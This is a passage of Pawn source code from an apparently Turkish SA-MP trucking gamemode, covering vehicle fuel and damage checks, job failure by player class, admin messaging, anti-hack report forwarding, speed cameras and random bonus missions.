   			    	SetVehicleHealth(vehid,300);
   			    	//new alarm,doors,bonnet,boot,objective;
       				SetVehicleParamsEx(vehid, 0, 0, alarm, doors, bonnet, boot, objective);
       				MotorMOD[vehid] = 0;
       				if(carmsg[playerid] == 0) // varsayilan deger
       				{
						carmsg[playerid] = 1; // arac bozuldugunda 1 oluyor
					}
					else if(carmsg[playerid] == 2)
					{
				    	carmsg[playerid] = 2; // zaten bozuksa 2 ise ( bozuk mesaji yollanmiþ ) bidaha mesaj yollamiyor
					}
					if(carmsg[playerid] == 1) // bozuksa  1 ve mesaj yollanmadiysa mesaj yolluyor
					{
				    	SendClientMessage(playerid,-1,"{ffffff}Aracýnýz {ff0000} arýzalandý{ffffff}. Lütfen {ff0000}/tamir {ffffff}komutunu kullanarak aracýnýzý tamir edin.");
                    	carmsg[playerid] = 2;
					}
   				}
				if(AVehicleData[GetPlayerVehicleID(playerid)][Fuel] == 0)
				{
   			    	//new alarm,doors,bonnet,boot,objective;
       				SetVehicleParamsEx(vehid, 0, 0, alarm, doors, bonnet, boot, objective);
       				MotorMOD[vehid] = 0;
       				if(carmsg[playerid] == 0) // varsayilan deger
       				{
						carmsg[playerid] = 1; // arac bozuldugunda 1 oluyor
					}
					else if(carmsg[playerid] == 2)
					{
				    	carmsg[playerid] = 2; // zaten bozuksa 2 ise ( bozuk mesaji yollanmiþ ) bidaha mesaj yollamiyor
					}
					if(carmsg[playerid] == 1) // bozuksa  1 ve mesaj yollanmadiysa mesaj yolluyor
					{
				    	SendClientMessage(playerid,-1,"{ffffff}Aracýnýzýn {ff0000}benzini bitti{ffffff}.");
                    	carmsg[playerid] = 2;
					}
				}
	    	}
			if(!IsPlayerInAnyVehicle(playerid))
			{
				for(new v; v < MAX_VEHICLES; v++)
				{
   					if(GetVehicleModel(v) == 0) continue;
					if(VehicleIsLocked[v] == 1)
					{
						SetVehicleParamsForPlayer(v, playerid,0,1);
					}else{
						SetVehicleParamsForPlayer(v, playerid,0,0);
					}
				}
			}
		}
	}

	// Rekor Sistemi
	RekorOlc();

	// Metin ile Sabah Sabah Delirmece
	ControlVehiclesMotor();

	// Þirket Sistemi
	SirketArabaControl();

	// Anti Flood Sistemi + Anti Crasher
	ModControlTimer++;

	if(ModControlTimer == 120)
	{
		ModControlTimer = 0;
		AllVehicleModControl();
	}

// Random Server HostName
	RandomSHNTimer++;
	if(RandomSHNTimer == 3)
	{
		RandomSHNTimer = 0;
		if(BakimYapLo == 0)
		{
			new RCNCMD[180];
			format(RCNCMD, 180, "hostname %s", RandomServerHostName[ random( sizeof(RandomServerHostName) ) ]);
			SendRconCommand(RCNCMD);
		}else{
			new RCNCMD[180];
			format(RCNCMD, 180, "hostname %s", RandomServerHostName2[ random( sizeof(RandomServerHostName2) ) ]);
			SendRconCommand(RCNCMD);
			}

	}

	// Þirket Sistemi
	SirketKayitTimer++;
	if(SirketKayitTimer == 300)
	{
		SirketKayitTimer = 0;
		SaveSirkets();
		SaveSirketArabas();
	}

	//SirketKapiControl();
	SirketZoneControl();

	// Saklý Kasa Sistemi
	UpdateSakliKasa();
	return 1;
}

// This function is called by the global vehicletimer to fail a job
FailJob(playerid)
{
	// Check the class of the player
	switch (APlayerData[playerid][PlayerClass])
	{
		case ClassTruckDriver:
		{
		    // End the player's job
			Trucker_EndJob(playerid);
			// If the player is part of a convoy, kick him from it (as he failed his mission, the rest of the convoy would be stuck)
			Convoy_Leave(playerid);
		}
 		case ClassBusDriver:
		{
		    // End the player's job
			BusDriver_EndJob(playerid);
			// If the player is part of a convoy, kick him from it (as he failed his mission, the rest of the convoy would be stuck)
			Convoy_Leave(playerid);
		}
		case ClassMafia:
		{
		    // End the player's job
			Mafia_EndJob(playerid);
		}
		case ClassBanka:
		{
		    // End the player's job
			Banka_EndJob(playerid);
		}
		case ClassRoadWorker:
		{
		    // End the player's job
			Roadworker_EndJob(playerid);
		}
 		case ClassGemici:
		{
		    // End the player's job
			Gemici_EndJob(playerid);
		}
  		case ClassOduncu:
		{
		    // End the player's job
			Oduncu_EndJob(playerid);
		}
  		case ClassBalikci:
		{
		    // End the player's job
			Balikci_EndJob(playerid);
		}
		case ClassPboy:
		{
		    // End the player's job
			Pboy_EndJob(playerid);
		}
		case ClassKargocu:
		{
		    // End the player's job
			StopKargocuGorev(playerid);
		}
		case ClassDolmusDriver:
		{
		    // End the player's job
			DolmusDriver_EndJob(playerid);
		}
	}

	// Inform the player that he failed the mission
	GameTextForPlayer(playerid, TXT_FailedMission, 5000, 4);
	// Reduce the player's cash by 1000
	RewardPlayer(playerid, -1000, 0);


}

// This function is used by the global vehicletimer and informs the player that he left his vehicle and must re-enter it
PlayerLeftVehicle(playerid)
{
	// Setup local variables
	new TimeLeft[5];

	// Reduce the time left by 1
	APlayerData[playerid][VehicleTimerTime] = APlayerData[playerid][VehicleTimerTime] - 1;
	// Convert the time left to a string for displaying
	valstr(TimeLeft, APlayerData[playerid][VehicleTimerTime]);
	// Display the time left
	GameTextForPlayer(playerid, TimeLeft, 1000, 4);
	// Send only one message to inform the player what he must do
	if (APlayerData[playerid][VehicleTimerTime] == (Job_TimeToFailMission - 1))
	{
		// Check the class of the player and inform them what to do
		switch (APlayerData[playerid][PlayerClass])
		{
			case ClassTruckDriver:
			{
				SendClientMessage(playerid, 0xFFFFFFFF, TXT_TruckerMustEnterVehicle);
				if((VIP[playerid] == 1 || YVIP[playerid] == 1) && APlayerData[playerid][TrailerID] != 0)
				{
				    SendClientMessage(playerid, -1, "{FF0000}/getdorse {F8F8FF}yazarak görev yaptýðýnýz dorseyi yanýnýza çekebilirsiniz.");
				}
			}
			case ClassMafia:
			    SendClientMessage(playerid, 0xFFFFFFFF, TXT_MafiaMustEnterVehicle);
   			case ClassBanka:
			    SendClientMessage(playerid, 0xFFFFFFFF, TXT_MafiaMustEnterVehicle);
            case ClassDolmusDriver:
				SendClientMessage(playerid, 0xFFFFFFFF, TXT_DolmusDriverMustEnterDolmus);
			case ClassRoadWorker:
			    SendClientMessage(playerid, 0xFFFFFFFF, TXT_RoadworkerMustEnterVehicle);
		}
	}
}

// ************************************************************************************************************************************************************
// PPC_Common
// ************************************************************************************************************************************************************

// This functions gives the player the given amount of money and scorepoints
RewardPlayer(playerid, Money, Points)
{
	// Add the given amount of money to the player's account
	APlayerData[playerid][PlayerMoney] = APlayerData[playerid][PlayerMoney] + Money;
	// Add the given amount of scorepoints to the player's account
	APlayerData[playerid][PlayerScore] = APlayerData[playerid][PlayerScore] + Points;
}

// This function creates the vehicle and saves the vehicle-lodel in the AVehicleData-array (can only be used during GameModeInit)
// It also sets the fuel to maximum
Vehicle_AddStatic(vModel, Float:vX, Float:vY, Float:vZ, Float:vRotation, vC1, vC2, vSpawnDelay)
{
	// Create a new static vehicle during GameModeInit
	new vid = AddStaticVehicleEx(vModel, vX, vY, vZ, vRotation, vC1, vC2, vSpawnDelay);
	// Save the vehicle-model
    AVehicleData[vid][Model] = vModel;
	// Set the fuel to maximum so the vehicle can be used
    AVehicleData[vid][Fuel] = MaxFuel;
	// Save the colors
    AVehicleData[vid][Color1] = vC1;
    AVehicleData[vid][Color2] = vC2;
	// Set this vehicle as a static vehicle
	AVehicleData[vid][StaticVehicle] = true;

	return vid;
}

// This function is the same as Vehicle_AddStatic, but uses CreateVehicle instead of AddStaticVehicleEx, so can be used everywhere
Vehicle_Create(vModel, Float:vX, Float:vY, Float:vZ, Float:vRotation, vC1, vC2, vSpawnDelay)
{
	// Create a new static vehicle during GameModeInit
	new vid = CreateVehicle(vModel, vX, vY, vZ, vRotation, vC1, vC2, vSpawnDelay);
	// Save the vehicle-model
    AVehicleData[vid][Model] = vModel;
	// Set the fuel to maximum so the vehicle can be used
    AVehicleData[vid][Fuel] = MaxFuel;
	// Save the colors
    AVehicleData[vid][Color1] = vC1;
    AVehicleData[vid][Color2] = vC2;

	AVehicleData[vid][StaticVehicle] = false;
	AVehicleData[vid][Owned] = false;
	ArabaSirket[vid] = -1;
	TrailerSakliKasa[vid] = -1;
	return vid;
}

// This function deletes the vehicle and clears all the data (is only used for player-owned vehicles)
Vehicle_Delete(vid)
{
	// Setup local variables
	new HouseIDSE, CarSlot;

	// Get the HouseID and CarSlot where the vehicle is linked to
	HouseIDSE = AVehicleData[vid][BelongsToHouse];

	// Check if this was a valid HouseID
	if (HouseIDSE != 0)
	{
		// Loop through all carslots of this house to find the vehicle-id
		for (new i; i < 11; i++)
		{
			// Check if this carslot holds the same vehicle-id
		    if (AHouseData[HouseIDSE][VehicleIDs][i] == vid)
		    {
		        CarSlot = i; // The carslot has been found where the vehicle is stored, remember it
				break; // Stop the for-loop
			}
		}

		// Remove the vehicle from the house
		AHouseData[HouseIDSE][VehicleIDs][CarSlot] = 0;
	}

	if(AVehicleData[vid][Owned] == true)
	{
		//DestroyDynamic3DTextLabel(AVehicleData[vid][VehicleText]);
		//AVehicleData[vid][VehicleText] = Text3D:-1;
	}

	if(Flashing[vid] == true)
	{
	    KillTimer(FlashTime[vid]);
	    Flashing[vid] = false;
	}

	// Delete the vehicle
	DestroyVehicle(vid);
	// Clear the data
	AVehicleData[vid][Owned] = false;
	AVehicleData[vid][Owner] = 0;
	AVehicleData[vid][Model] = 0;
	AVehicleData[vid][PaintJob] = 0;
	for (new i; i < 14; i++)
	    AVehicleData[vid][Components][i] = 0;
	AVehicleData[vid][Color1] = 0;
	AVehicleData[vid][Color2] = 0;
	AVehicleData[vid][SpawnX] = 0.0;
	AVehicleData[vid][SpawnY] = 0.0;
	AVehicleData[vid][SpawnZ] = 0.0;
	AVehicleData[vid][SpawnRot] = 0.0;
	AVehicleData[vid][BelongsToHouse] = 0;
}

// This function returns "1" if both locations are not closeby and returns "0" if both locations are close to eachother
Locations_CheckDistance(LocationA, LocationB, Float:Range)
{
	// Setup local variables
	new Float:Xa, Float:Ya, Float:Xb, Float:Yb, Float:X, Float:Y;

	// Get the coordinates of LocationA
	Xa = ALocations[LocationA][LocX];
	Ya = ALocations[LocationA][LocY];
	// Get the coordinates of LocationB
	Xb = ALocations[LocationB][LocX];
	Yb = ALocations[LocationB][LocY];

	// Calculate the distances between both locations
	Y = Yb - Ya;
	X = Xb - Xa;

	// Check if both locations are further apart then the range indicates
	if (((X * X) + (Y * Y)) > (Range * Range))
		return 1; // Location B is further away from Location A than Range indicates
	else
	    return 0; // both locations are closer to eachother than Range indicates
}

/*/ This function ports all non-admin players out of the given area to the location specified
Player_PortOutAdminZone(playerid, Float:x1, Float:y1, Float:z1, Float:x2, Float:y2, Float:z2, Float:x3, Float:y3, Float:z3)
{
	// Setup local variables
	new Float:x, Float:y, Float:z;

	// Get the player's coordinates
	GetPlayerPos(playerid, x, y, z);

	// Check if the player is not an admin
	if (APlayerData[playerid][PlayerLevel] == 0)
		if ((x1 < x) && (x < x2))
		    if ((y1 < y) && (y < y2))
		        if ((z1 < z) && (z < z2))
				{
					SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}You're not allowed inside an admin-area");
					SetPlayerPos(playerid, x3, y3, z3); // Port the player out of the area
				}
}
*/

/*/ This function sends the given text to all admins
SendAdminText(playerid, command[], text[])
{
	// Setup local variables
	new Name[24], Msg[256];

	// Loop through all players
	for (new i; i < MAX_PLAYERS; i++)
	{
		// Check if the player is an admin
		if (APlayerData[i][PlayerLevel] >= APlayerData[playerid][PlayerLevel] && APlayerData[i][PlayerLevel] > 0 || Root[i] == 1)
		{
			// Get the player's name
			GetPlayerName(playerid, Name, sizeof(Name));
			// Send the given text to the admin
			format(Msg, 256, "{a2b9b9}[Komut]%s(%d): %s %s", Name, playerid, command, text);
			SendClientMessage(i, 0xFFFFFFFF, Msg);
		}
	}

	// Also log all used commands in the server.log file
	format(Msg, 256, "[CMD] %s: %s %s", Name, command, text);
	print(Msg);
}*/
// This function sends the given text to all admins
SendAdminText(playerid, command[], text[])
{
	// Setup local variables
	new Name[24], Msg[256];

	// Loop through all players
	for (new i; i < MAX_PLAYERS; i++)
	{
		// Check if the player is an admin
		if (APlayerData[i][PlayerLevel] >= APlayerData[playerid][PlayerLevel] && APlayerData[i][PlayerLevel] > 0 || Root[i] == 1)
		{
			// Get the player's name
			GetPlayerName(playerid, Name, sizeof(Name));
			// Send the given text to the admin
			format(Msg, 256, "%s(%d):%s %s", Name, playerid, command, text);
			ScrollSendAdminText(i, Msg);
			//SendClientMessage(i, 0xFFFFFFFF, Msg);
		}
	}

	// Also log all used commands in the server.log file
	format(Msg, 256, "[CMD] %s: %s %s", Name, command, text);
	print(Msg);
}
SendDuyuruText(text[])
{
	// Setup local variables
	new Msg[256];
    
	// Loop through all players
	for (new i; i < MAX_PLAYERS; i++)
	{
		if(APlayerData[i][LoggedIn] == true)
		{
			format(Msg, 256, "%s", text);
			ScrollSendDuyuruText(i, Msg);
			//SendClientMessage(i, 0xFFFFFFFF, Msg);
		}
	}

	// Also log all used commands in the server.log file
	format(Msg, 256, "[Duyuru] %s",text);
	print(Msg);
}
// This timer informs the player how long he will be frozen
forward Player_FreezeTimer(playerid);
public Player_FreezeTimer(playerid)
{
	// Setup local variables
	new Msg[128];

	// Decrease the remaining time this player will be frozen
    APlayerData[playerid][PlayerFrozen]--;

	// Check if the player is allowed to move again
	if (APlayerData[playerid][PlayerFrozen] > 0)
	{
		// Construct the message to inform the player how long he stays frozen
		if (APlayerData[playerid][PlayerFrozen] >= 60)
			format(Msg, 128, " %i dakika donduruldunuz", APlayerData[playerid][PlayerFrozen] / 60);
		else
			format(Msg, 128, " %i saniye donduruldunuz", APlayerData[playerid][PlayerFrozen]);

		// Display the message to inform the player how long he stays frozen
		GameTextForPlayer(playerid, Msg, 1000, 4);
	}
	else // The timer has run out, so allow his to move again
	{
	    TogglePlayerControllable(playerid, 1);
	    freeze[playerid] = 0;
		KillTimer(APlayerData[playerid][PlayerFrozenTimer]);
	}
}

// This function creates a list of commands, starting from the FirstCommand and automatically shows the dialog
CommandList_Create(playerid)
{
	// Setup local variables
	new Counter, CommandList[2000], DialogTitle[128];

	// Only add 4 commands to the list, starting from the FirstItem
	for (new i = APlayerData[playerid][DialogFirstItem]; i < sizeof(ACommands); i++)
	{
		// Increase a counter (which holds the number of commands that have been added to the list
		Counter++;

		// Check if the maximum hasn't been reached yet
		if (Counter <= 8)
		{
		    // Check if this command is valid for this player
			if (APlayerData[playerid][PlayerLevel] >= ACommands[i][CommandLevel] || Root[playerid] == 1)
			{
				// Check if the command is used for admins or not
				if (ACommands[i][CommandLevel] == 0)
				{
				    format(CommandList, 2000, "%s{ADFF2F}%s: {F8F8FF}%s\n", CommandList, ACommands[i][CommandStructure], ACommands[i][CommandDescription]);
				}
				else
				{
				    format(CommandList, 2000, "%s{FF0000}Lvl %i {ADFF2F}%s: {F8F8FF}%s\n", CommandList, ACommands[i][CommandLevel], ACommands[i][CommandStructure], ACommands[i][CommandDescription]);
				}
			}
			else
				break;
		}
		else // 5 commands have been added to the list (now Counter = 6)
		{
			format(CommandList, 2000, "%s{00FF7F}Sonraki Sayfa...", CommandList);
			break;
		}
	}

	// Construct the title for the dialog (to include a page number)
	format(DialogTitle, 128, TXT_DialogCommandTitle, (APlayerData[playerid][DialogFirstItem] / 8) + 1);
	// Show the commands in a dialog
	ShowPlayerDialog(playerid, DialogPlayerCommands, DIALOG_STYLE_LIST, DialogTitle, CommandList, TXT_DialogButtonSelect, TXT_DialogButtonCancel);

	return 1;
}

/*
CommandList_Create(playerid)
{
	// Setup local variables
	new Counter, CommandList[1000], DialogTitle[128];

	// Only add 4 commands to the list, starting from the FirstItem
	for (new i = APlayerData[playerid][DialogFirstItem]; i < sizeof(ACommands); i++)
	{
		// Increase a counter (which holds the number of commands that have been added to the list
		Counter++;

		// Check if the maximum hasn't been reached yet
		if (Counter <= 5)
		{
		    // Check if this command is valid for this player
			if (APlayerData[playerid][PlayerLevel] >= ACommands[i][CommandLevel] || Root[playerid] == 1)
			{
				// Check if the command is used for admins or not
				if (ACommands[i][CommandLevel] == 0)
				{
				    // Add the commandname and description to the list
					format(CommandList, 1000, "%s%s{00FF00}%s", CommandList, "\n", ACommands[i][CommandStructure]); // Add the name of the next command to the list on the next line
					format(CommandList, 1000, "%s%s\t\t{FFFF00}%s", CommandList, "\n", ACommands[i][CommandDescription]); // Add the description of the next command to the list on the next line
				}
				else
				{
				    // Add the commandname and description to the list
					format(CommandList, 1000, "%s%sLvl %i: {00FF00}%s", CommandList, "\n", ACommands[i][CommandLevel], ACommands[i][CommandStructure]); // Add the name of the next command to the list on the next line
					format(CommandList, 1000, "%s%s\t\t{FFFF00}%s", CommandList, "\n", ACommands[i][CommandDescription]); // Add the description of the next command to the list on the next line
				}
			}
			else
				break;
		}
		else // 5 commands have been added to the list (now Counter = 6)
		{
		    // Add an empty line and "Next..." to the list to let the player know there are more commands
			format(CommandList, 1000, "%s%s%s", CommandList, "\n \n", TXT_DialogEntryNext);
			// Also stop the For-loop
			break;
		}
	}

	// Construct the title for the dialog (to include a page number)
	format(DialogTitle, 128, TXT_DialogCommandTitle, (APlayerData[playerid][DialogFirstItem] / 5) + 1);
	// Show the commands in a dialog
	ShowPlayerDialog(playerid, DialogPlayerCommands, DIALOG_STYLE_LIST, DialogTitle, CommandList, TXT_DialogButtonSelect, TXT_DialogButtonCancel);

	return 1;
}
*/
// This function returns "1" if the given vehicle-id is a plane or helicopter
IsVehicleAirVehicle(vid)
{
	switch (GetVehicleModel(vid))
	{
		case 592, 577, 511, 512, 593, 520, 553, 476, 519, 460, 513, 548, 425, 417, 487, 488, 497, 563, 447, 469: return 1;
		default: return 0;
	}

	return 0;
}

// This function creates a speedcamera (store data and create the objects)
SetupSpeedCamera(CamID, Float:x, Float:y, Float:z, Float:rot, MaxSpeed)
{
    new TextMaxSpeed[255];
	// Store all the given values
    ACameras[CamID][CamX] = x;
    ACameras[CamID][CamY] = y;
    ACameras[CamID][CamZ] = z;
    ACameras[CamID][CamAngle] = rot;
    ACameras[CamID][CamSpeed] = MaxSpeed;
	// Create both camera objects and store their reference
    ACameras[CamID][CamObj1] = CreateObject(18880, x, y, z, 0.0, 0.0, rot);
    ACameras[CamID][CamObj2] = CreateObject(18880, x, y, z, 0.0, 0.0, rot + 180.0);
    format(TextMaxSpeed, sizeof(TextMaxSpeed), "%s %i", TXT_MaxSpeedCamera, MaxSpeed);
	ACameras[CamID][LabelID] = Create3DTextLabel(TextMaxSpeed, 0x008080FF, x, y, z + 0.75, 150.0, 0, 0);

}
// This function sends the report to all admins
SendReportToAdmins(OffenderID, Reason[], bool:AutoReport = false)
{
	// Setup local variables
	new Name[255], Msg[255], TxtMsg[255], TotalReason[255],Mesaj[255];

	// Get the name of the offender
	GetPlayerName(OffenderID, Name, sizeof(Name));

	// Construct the report message for all admins
	if (AutoReport == false)
	{
	    // Construct the report messages for a normal report
		format(Msg, 255, "{00FFFF}*** SIKAYET: %s (%i): %s", Name, OffenderID, Reason);
		format(TxtMsg, 255, "SIKAYET:~n~~g~%s (%i)~n~~r~%s", Name, OffenderID, Reason);
		format(TotalReason, 255, Reason);
	}
	else
	{
		format(Msg, 255, "[ANTIHACK] Þüpheli %s(%d) => %s", Name, OffenderID, Reason);
		LOG(Msg);
	    // Construct the report messages for an automated report (sent by the AntiHack function)
		format(Msg, 255, "{00FFFF}*** ALGILANDI: %s (%i): %s", Name, OffenderID, Reason);
		format(TxtMsg, 255, "ALGILANDI:~n~~g~%s (%i)~n~~r~%s", Name, OffenderID, Reason);
		format(TotalReason, 255, "%s (by AntiHack)", Reason);

		// For automated reports, preset the time to 60 seconds to stop the Anti-Hack system reporting the player every half a second
		APlayerData[OffenderID][AutoReportTime] = 120; // The time must be doubled, as the speedometer runs twice every second
	}

	// Loop through all the players to find all online admins
	for (new playerid; playerid < MAX_PLAYERS; playerid++)
	{
	    // Check if this player is an admin
	    if (APlayerData[playerid][PlayerLevel] >= 1 || Root[playerid] == 1 )
	    {
			// Send a message to the admin to inform him about the report
			SendClientMessage(playerid,-1," ");
			SendClientMessage(playerid, 0xFFFFFFFF, Msg);
			// Also send the admin a GameText-message so he can see it more clearly
			GameTextForPlayer(playerid, TxtMsg, 10000, 4);
			//SendClientMessage(playerid,-1," "); SendClientMessage(playerid,-1," ");
			format(Mesaj,255,"{FF0000}Þüpheli Oyuncu :{ffffff} %s (%d) {FF0000} Hile Türü : {ffffff} %s",Name, OffenderID, Reason);
			SendClientMessage(playerid,-1,Mesaj);
	    }
	}

	// Add the report to the AReports-array so admins can review it in a dialog (maximum 50 reports can be stored)
	AddReport(OffenderID, TotalReason);
}

// This function adds the report to the AReports array automatically
AddReport(OffenderID, Reason[])
{
	// Setup local variables
	new ReportID = -1, Name[24];

	// Check if there is a free spot in the AReports array
	for (new i; i < 50; i++)
	{
		// Check if this report-spot is empty
		if (AReports[i][ReportUsed] == false)
		{
		    ReportID = i;
		    break; // If this spot hasn't been used yet, stop the for-loop
		}
	}

	// If no spot is free (ReportID is still -1)
	if (ReportID == -1)
	{
		// Drop the report on ID 0, and move them all downwards
		for (new i = 1; i < 50; i++)
		{
			AReports[i - 1][ReportUsed] = AReports[i][ReportUsed];
			format(AReports[i - 1][ReportName], 24, "%s", AReports[i][ReportName]);
			format(AReports[i - 1][ReportReason], 128, "%s", AReports[i][ReportReason]);
		}

		// ReportID 49 is available now, so use this to add the new report
		ReportID = 49;
	}

	// Get the name of the offender
	GetPlayerName(OffenderID, Name, sizeof(Name));

	// Store the data into the array
	AReports[ReportID][ReportUsed] = true;
	format(AReports[ReportID][ReportName], 24, "%s", Name);
	format(AReports[ReportID][ReportReason], 128, "%s", Reason);
}

// This function converts an ip-address into 4 separate integer parts and returns a string that only holds the first three parts
GetFirstThreeDigitsFromIP(PlayerIP[])
{
	// Setup local variables
	new Part1, Part2, Part3, DotLoc, RetIP[16];

	// Get the first part of the IP-address
	Part1 = strval(PlayerIP[0]);

	// Find the first dot
	DotLoc = strfind(PlayerIP, ".", false, 0);
	// Get the second part of the IP-address (the part that follows the first dot)
	Part2 = strval(PlayerIP[DotLoc+1]);

	// Find the second dot
	DotLoc = strfind(PlayerIP, ".", false, DotLoc+1);
	// Get the third part of the IP-address (the part that follows the second dot)
	Part3 = strval(PlayerIP[DotLoc+1]);

	// Combine them all into an IP that only holds the first three digits, followed by a dot
	format(RetIP, 16, "%i.%i.%i.", Part1, Part2, Part3);
	// Return it to the calling function
	return RetIP;
}

// This timer is executed every 2 minutes and sends all timedmessages one at a time
/*
forward Timer_TimedMessages();
public Timer_TimedMessages()
{

		    SendDuyuruText(ATimedMessages[LastTimedMessage]);
			//format(Msg, 256, "%s", text);
			//ScrollSendDuyuruText(i, Msg);
			//SendClientMessage(i, 0xFFFFFFFF, Msg);


   //SendDuyuruText(playerid, ATimedMessages[LastTimedMessage]);

	// Send the message
	//SendClientMessageToAll(0xFFFFFFFF, ATimedMessages[LastTimedMessage]);

	// Select the next message
    LastTimedMessage++;

	// Check if the next chosen message exists (the messagenumber is the same as the size of the array of messages)
	if (LastTimedMessage == sizeof(ATimedMessages))
	    LastTimedMessage = 0; // Select the first message again

	return 1;
}*//*
forward Timer_TimedMessages();
public Timer_TimedMessages()
{
  		for(new i=0;i < MAX_PLAYERS;i++)
 		{
	new string[1024];
    format(string, sizeof string, ATimedMessages[LastTimedMessage]);
    SendDuyuruText(i, string);
	// Select the next message
    LastTimedMessage++;

	// Check if the next chosen message exists (the messagenumber is the same as the size of the array of messages)
	if (LastTimedMessage == sizeof(ATimedMessages))
	    LastTimedMessage = 0; // Select the first message again
		}
	return 1;
}*/

// This timer is executed every 5 minutes and sends the data about a random bonus mission to every trucker
forward ShowRandomBonusMission();
public ShowRandomBonusMission()
{
	// Setup local variables
	new bool:MissionSet = false, Msg1[128], Msg2[128], Msg3[128], lName[50], sName[50], eName[50], tName[100];

	// Check if there is no mission defined yet (only happens when server is restarted), or when the mission has been completed by a player
	if ((RandomBonusMission[RandomLoad] == 0) || (RandomBonusMission[MissionFinished] == true))
	{
		// Keep checking until a valid mission has been set
		while (MissionSet == false)
		{
			// Choose a random LoadID
	        RandomBonusMission[RandomLoad] = random(sizeof(ALoads));

			switch (RandomBonusMission[RandomLoad])
			{
				case 0: MissionSet = false; // If the dummy load has been chosen, allow the while loop to run again to search for another valid load
				default: // If another load has been chosen, check if it is a trucker load
				{
					switch(ALoads[RandomBonusMission[RandomLoad]][PCV_Required]) // Check the class & vehicle variable
					{
					    case PCV_TruckerOreTrailer, PCV_TruckerFluidsTrailer, PCV_TruckerCargoTrailer, PCV_TruckerCementTruck, PCV_TruckerNoTrailer:
					    {
					        // Now only the loads for truckers are checked
							MissionSet = true; // The load has been determined now as it's a valid load for truckers only
					    }
					    default: MissionSet = false; // If another class & vehicle has been chosen (mafia or pilot load), search again
					}
				}
			}
		}

		// Find a random startlocation and endlocation from the chosen load
	    RandomBonusMission[RandomStartLoc] = Product_GetRandomStartLoc(RandomBonusMission[RandomLoad]);
	    RandomBonusMission[RandomEndLoc] = Product_GetRandomEndLoc(RandomBonusMission[RandomLoad]);

		/* Anti Kýsa Mesafe
		new Float:Mesafe, Float:xcarpim, Float:ycarpim, Float:zcarpim;
		xcarpim = (ALocations[RandomBonusMission[RandomStartLoc]][LocX]-ALocations[RandomBonusMission[RandomEndLoc]][LocX]) * (ALocations[RandomBonusMission[RandomStartLoc]][LocX]-ALocations[RandomBonusMission[RandomEndLoc]][LocX]);
		ycarpim = (ALocations[RandomBonusMission[RandomStartLoc]][LocY]-ALocations[RandomBonusMission[RandomEndLoc]][LocY]) * (ALocations[RandomBonusMission[RandomStartLoc]][LocY]-ALocations[RandomBonusMission[RandomEndLoc]][LocY]);
		zcarpim = (ALocations[RandomBonusMission[RandomStartLoc]][LocZ]-ALocations[RandomBonusMission[RandomEndLoc]][LocZ]) * (ALocations[RandomBonusMission[RandomStartLoc]][LocZ]-ALocations[RandomBonusMission[RandomEndLoc]][LocZ]);

		Mesafe = floatsqroot(xcarpim + ycarpim + zcarpim);

		if(Mesafe < 1500.0)
		{
			MissionSet = false;
			ShowRandomBonusMission();
	    	return 1;
		}
		*/
		// Set the new random mission as not-completed yet
		RandomBonusMission[MissionFinished] = false;
	}

	// Get the names of the load, start-location and end-location
	format(lName, 50, ALoads[RandomBonusMission[RandomLoad]][LoadName]);
	format(sName, 50, ALocations[RandomBonusMission[RandomStartLoc]][LocationName]);
	format(eName, 50, ALocations[RandomBonusMission[RandomEndLoc]][LocationName]);
	// Setup the name of the vehicle you'll need for this mission
	switch(ALoads[RandomBonusMission[RandomLoad]][PCV_Required])
	{
		case PCV_TruckerOreTrailer: format(tName, 128, "Týr ve Açýk Kasa");
		case PCV_TruckerFluidsTrailer: format(tName, 128, "Týr ve Sývý Kasa (Tanker)");
		case PCV_TruckerCargoTrailer: format(tName, 128, "Týr ve Kapalý Kasa (Box)");
		case PCV_TruckerCementTruck: format(tName, 128, "Çimento Kamyonu");
		case PCV_TruckerNoTrailer: format(tName, 128, "DFT-30 Kamyonu");
	}

	// Construct the messages that describe the mission
	format(Msg1, 128, "{FFCC00}BONUS GÖREV {DDDDDD}- Yük Ýsmi: {FFCC00}%s", lName);
	format(Msg2, 128, "{DDDDDD}Alýnacak Yer : {FFCC00}%s{DDDDDD} Býrakýlacak Yer : {FFCC00}%s", sName, eName);
	format(Msg3, 128, "{DDDDDD}Ýhtiyacýnýz olan : {FFCC00}%s{FFFFFF} ( EHLIYET GEREKLIDIR )", tName);

	// Now send the data about the random mission to all truckers
	for (new playerid; playerid < MAX_PLAYERS; playerid++)
	{
		// Check if this player is online
		if (APlayerData[playerid][LoggedIn] == true)
		{
			// Check if this player is a trucker
			if (APlayerData[playerid][PlayerClass] == ClassTruckDriver)
			{
				SendClientMessage(playerid, 0xFFFFFFFF, Msg1);
				SendClientMessage(playerid, 0xFFFFFFFF, Msg2);
				SendClientMessage(playerid, 0xFFFFFFFF, Msg3);
			}
		}
	}

	return 1;
}

ShowRBM(playerid)
{
	new lName[50], sName[50], eName[50], tName[128], Msg1[128], Msg2[128], Msg3[128];

	// Get the names of the load, start-location and end-location
	format(lName, 50, ALoads[RandomBonusMission[RandomLoad]][LoadName]);
	format(sName, 50, ALocations[RandomBonusMission[RandomStartLoc]][LocationName]);
	format(eName, 50, ALocations[RandomBonusMission[RandomEndLoc]][LocationName]);
	// Setup the name of the vehicle you'll need for this mission
	switch(ALoads[RandomBonusMission[RandomLoad]][PCV_Required])
	{
		case PCV_TruckerOreTrailer: format(tName, 128, "Týr ve Açýk Kasa");
		case PCV_TruckerFluidsTrailer: format(tName, 128, "Týr ve Sývý Kasa (Tanker)");
		case PCV_TruckerCargoTrailer: format(tName, 128, "Týr ve Kapalý Kasa (Box)");
		case PCV_TruckerCementTruck: format(tName, 128, "Çimento Kamyonu");
		case PCV_TruckerNoTrailer: format(tName, 128, "DFT-30 Kamyonu");
	}

	// Construct the messages that describe the mission
	format(Msg1, 128, "{FFA500}BONUS GÖREV {DDDDDD}- Yük Ýsmi: {ADFF2F}%s", lName);
	format(Msg2, 128, "{DDDDDD}Alýnacak Yer : {ADFF2F}%s{DDDDDD} Býrakýlacak Yer : {ADFF2F}%s", sName, eName);
	format(Msg3, 128, "{DDDDDD}Ýhtiyacýnýz olan : {ADFF2F}%s{4867FF} ( EHLIYET GEREKLIDIR )", tName);

	SendClientMessage(playerid, -1, Msg1);
	SendClientMessage(playerid, -1, Msg2);
	SendClientMessage(playerid, -1, Msg3);
	return 1;
}

// This function creates a list of help-items, for which the player can get information about it
HelpList_Create(playerid)
{
	// Setup local variables
	new HelpList[1000], DialogTitle[128];

	// Construct the title for the dialog (to include a page number)
	format(DialogTitle, 128, "Yardim Almak Icin Dogru Yerdesiniz");

    // Add all help-topics to the list
